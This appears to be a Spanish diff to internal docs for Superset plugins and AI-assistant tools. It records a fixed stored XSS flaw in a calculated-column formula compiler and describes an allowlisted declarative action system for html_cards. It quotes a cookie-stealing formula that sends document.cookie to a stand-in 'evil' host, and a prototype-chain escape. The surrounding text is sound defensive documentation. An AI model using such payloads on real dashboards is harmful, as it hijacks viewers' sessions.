@@ -572,6 +572,35 @@ analíticas de dashboards quedan fuera incluso si el MCP las anuncia mediante
   Si `warnings` no está vacío y la fórmula usa `total.{{...}}`, agregar
   `{"op": "set", "control": "show_totals", "value": true}` a la MISMA
   propuesta (`patch_form_data`), no una aparte.
+
+  **Hallazgo de seguridad 2026-09-29 (corregido)**: el compilador real
+  (`calculatedColumns.ts::buildJsExpression`) solo traduce nombres
+  ALL-CAPS conocidos (`IF`, `OR`, ...) y dejaba pasar CUALQUIER otro
+  identificador intacto hasta `new Function(...)` — que no aísla del
+  scope global del navegador. Una fórmula como
+  `(1, fetch('https://evil/steal?c='+document.cookie))` no tiene ninguna
+  palabra en mayúsculas, compilaba y EJECUTABA de verdad con acceso real
+  a `document`/`window`/`fetch` (Stored XSS: cualquier usuario con permiso
+  de editar el gráfico podía inyectarla, y corría en el navegador de
+  cualquiera que viera ese gráfico, incluido en dashboards compartidos).
+  `irex.validate_calculated_column_formula` tampoco lo detectaba (mismo
+  filtro solo-ALL-CAPS). Corregido en ambos lados con una allowlist
+  ESTRICTA (blanquear lo conocido, rechazar cualquier identificador que
+  sobreviva la sustitución — no una lista de palabras peligrosas):
+  `calculatedColumns.ts::findDisallowedIdentifier` (la barrera real, en el
+  navegador — una fórmula así ahora compila a un evaluador nulo, igual que
+  cualquier otra fórmula inválida) y
+  `explore_calculated_column_core.py::extract_unknown_function_tokens`
+  (ahora recibe `known_names` y ya no enmascara `scope.Nombre` sin llaves
+  salvo que `Nombre` sea una columna/métrica real — mismo criterio que
+  `SCOPED_BARE_REGEX` del compilador — para que el validador tampoco deje
+  pasar un `total`/`col`/`row` suelto usado como punto de entrada a la
+  cadena de prototipos, ej. `total.constructor.constructor(...)`).
+  `valid: false` ahora incluye el identificador exacto bajo
+  `unknown_functions` con el error `"identificadores/funciones no
+  reconocidos: ..."`. Verificado que fórmulas legítimas reales (incluida
+  la del caso `show_totals` de arriba) siguen compilando y validando
+  igual que antes.
 - `irex.explain_chart`, `irex.preview_chart` (implementadas, entrada 71 de
   `Registro de cambios.md`, 2026-09-24; `irex.check_chart_nulls` sigue
   pendiente): solo lectura, ligadas al gráfico, con acceso al dataset, RLS y
@@ -605,3 +634,42 @@ ocurre un error, emite `error`. El mismo endpoint devuelve JSON si no se pide
 SSE. El modelo, el timeout y el esfuerzo de razonamiento son los mismos que
 los del asistente de SQL Lab; no hay un nombre de modelo fijado en este
 contrato.
+
+## Interactividad declarativa en html_cards (2026-09-29)
+
+A pedido del usuario ("busco algo más dinámico pero sin que llegue a ser
+inseguro" para comportamientos JS en tarjetas), se generalizó el patrón que
+ya existía solo para tablas (`data-hc-sort`/`data-hc-resize`) a un
+vocabulario declarativo genérico: `data-hc-on="click"` (también dblclick/
+mouseenter/mouseleave/change/submit) + `data-hc-action="nombre:arg1,arg2"`
+(varias encadenadas con `;`) + `data-hc-target="selector"` opcional. El
+modelo escribe NOMBRES de acción y argumentos de texto plano en
+`handlebarsTemplate` — nunca código — que `dynamicActions.ts`
+(`custom-plugins/plugin-chart-html-cards/src/utils/`) parsea con
+`split()`/`trim()` puro y despacha a un registro fijo de funciones ya
+auditadas (`toggleClass`/`addClass`/`removeClass`, `toggleAttr`, `scrollTo`,
+`setStyleVar`, `copyText`, `countUp`). Una acción no reconocida se ignora
+(warning en consola), nunca se interpreta como expresión ejecutable.
+
+**Por qué esto importa más que en otros plugins**: a diferencia de
+`calculated_columns` (table_v3), donde el `HTML_SANITIZATION` de Superset sí
+filtra HTML antes de renderizar cualquier otro control, `html_cards`
+(`handlebarsTemplate`) usa `dangerouslySetInnerHTML` con el resultado de
+`sanitizeHtmlIfNeeded`, que en esta instalación tiene `HTML_SANITIZATION=False`
+(confirmado en test y prod) — es decir, **NO sanitiza nada**: un
+`<script>`/`onClick=` inline en `handlebarsTemplate` ya ejecutaría hoy, sin
+ningún bug de compilador de por medio (a diferencia del hallazgo de
+`calculated_columns`, que sí dependía de un bug real). El vocabulario
+declarativo no es una barrera técnica adicional sobre eso — es la
+alternativa SEGURA que el modelo debería preferir siempre en vez de HTML/JS
+crudo, documentada explícitamente en el campo `note` (ver abajo) para que el
+modelo no tenga necesidad de recurrir a `<script>` inline.
+
+`irex.get_viz_controls(viz_type="html_cards")` devuelve, además de
+`control_info`, un campo `note` de nivel superior (no sujeto al límite de
+2000 caracteres de `control_info[control].description` — no había lugar en
+`handlebarsTemplate`, que ya estaba en 1977/2000) con el vocabulario
+completo de acciones, la lista de eventos permitidos, un ejemplo, y la
+advertencia sobre `HTML_SANITIZATION`/`<script>` de arriba. El tooltip de
+ayuda del control en la propia UI de Superset (`handlebarTemplate.tsx`)
+documenta lo mismo en inglés, más corto.
